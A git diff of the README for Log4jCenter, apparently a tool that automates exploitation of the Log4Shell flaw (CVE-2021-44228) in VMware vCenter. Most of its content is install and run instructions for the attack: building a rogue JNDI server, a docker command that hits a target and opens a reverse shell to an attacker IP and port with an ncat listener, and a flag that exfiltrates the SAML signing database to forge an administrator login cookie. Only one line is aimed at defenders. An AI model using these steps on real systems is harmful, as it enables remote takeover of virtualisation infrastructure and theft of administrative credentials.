@@ -8,7 +8,9 @@ Exploiting CVE-2021-44228 in vCenter for remote code execution and more. Blog po
 
 Proof of concepts for this vulnerability are scattered and have to be performed manually. This repository automates the exploitation process and showcases an additional attack path that is possible after exploitation.
 
-# Manual install
+# Install
+
+### Manual install
 
 This repository can be used manually or with Docker. To download and run the exploit manually, execute the following steps:
 
@@ -21,7 +23,8 @@ apt update && apt install openjdk-11-jre maven
 Clone the GitHub repository and install all python requirements:
 
 ```
-git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter && cd Log4jCenter && pip3 install -r requirements.txt
+git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter \
+    && cd Log4jCenter && pip3 install -r requirements.txt
 ```
 
 From the root of the Log4jCenter repository, compile the Rogue-Jndi project using the command below:
@@ -30,20 +33,22 @@ From the root of the Log4jCenter repository, compile the Rogue-Jndi project usin
 mvn package -f utils/rogue-jndi/
 ```
 
-# Docker install
+### Docker install
 
 First, ensure that Docker is installed on your attacking host. (I am not going to walk you through doing this)
 
 Following that, execute the following command to clone the repository and build the Docker image we will be using.
 
 ```
-git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter && cd Log4jCenter && docker build -t Log4jCenter .
+git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter \
+    && cd Log4jCenter && docker build -t Log4jCenter .
 ```
 
 To run the container, run a command similar to the following with your command line flags appended. For example, the command below would be used to exploit vCenter and get a reverse shell. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:
 
 ```
-docker run -it -v $(pwd):/Log4jCenter -p 1389:1389 Log4jCenter -t 10.100.100.1 -i 192.168.1.1 -p 4444 -r
+docker run -it -v $(pwd):/Log4jCenter -p 1389:1389 Log4jCenter \ 
+    -t 10.100.100.1 -i 192.168.1.1 -p 4444 -r
 ```
 
 
@@ -64,7 +69,7 @@ optional arguments:
 
 # Notes
 
-* Included in the utils directory is the repository [vcenter_saml_login](https://github.com/horizon3ai/vcenter_saml_login). You can use this in combination with the `-e` flag to exfiltrate the vCenter SAML signing database and generate an administrative login cookie for vSphere. You will need to install requirements separately.
+* Included in the utils directory is the repository [vcenter_saml_login](https://github.com/horizon3ai/vcenter_saml_login). You can use this in combination with the e flag to exfiltrate the vCenter SAML signing database and generate an administrative login cookie for vSphere. You will need to install requirements separately.
 * For defenders, you can mitigate this issue using a patch coming soon or the workaround detailed [here](https://kb.vmware.com/s/article/87081)
 
 # Disclaimer
